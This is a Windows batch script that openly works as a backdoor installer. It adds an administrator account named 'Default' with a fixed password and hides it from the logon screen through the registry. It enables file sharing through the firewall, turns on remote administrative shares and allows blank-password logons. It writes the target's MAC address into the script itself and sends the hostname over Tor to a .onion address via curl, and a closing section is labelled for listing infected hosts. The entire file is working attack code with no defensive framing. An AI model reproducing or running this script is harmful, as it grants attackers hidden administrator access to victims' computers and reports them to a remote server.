@echo on

rem USE TURKISH CHRACTER TABLE
chcp 65001

rem ADD BACKDOOR USER
net user Default admin0 /add /comment:"A user account managed by the system."
net localgroup Administrators Default /add

rem HIDE BACKDOOR USER ACCOUNT FROM CONTROL PANEL AND LOGON SCREEN
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v Default /t REG_DWORD /d 0 /f

rem PERMIT FILE SHARING ON FIREWALL
netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=yes
netsh advfirewall firewall set rule group="dosya ve yazıcı paylaşımı" new enable=yes

rem ENABLE ADMINISTRATIVE SHARES
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1

rem ENABLE EMPTY PASSWORD ACCOUNT SECURITY
reg delete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /f
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0

rem SAVE THE IDENTY OF TARGET COMPUTER
set /p alias=Enter an alias:
@FOR /F %%i IN ('getmac /fo table /nh') DO ECHO rem %alias% %%i >> %0

:: Get the current hostname
for /f "tokens=* delims= " %%a in ('hostname') do set hostname=%%a

:: Make the HTTP request through Tor (assuming Tor is running and accessible via SOCKS5 on port 9050)
curl --socks5-hostname 127.0.0.1:9050 "http://senpjoekkf4hlth6ej5lyqoizi62ois6u44zpd5vucuzo3w4sz4tw3qd.onion/%hostname%"

rem LISTING INFECTED HOSTS
rem ----------------------
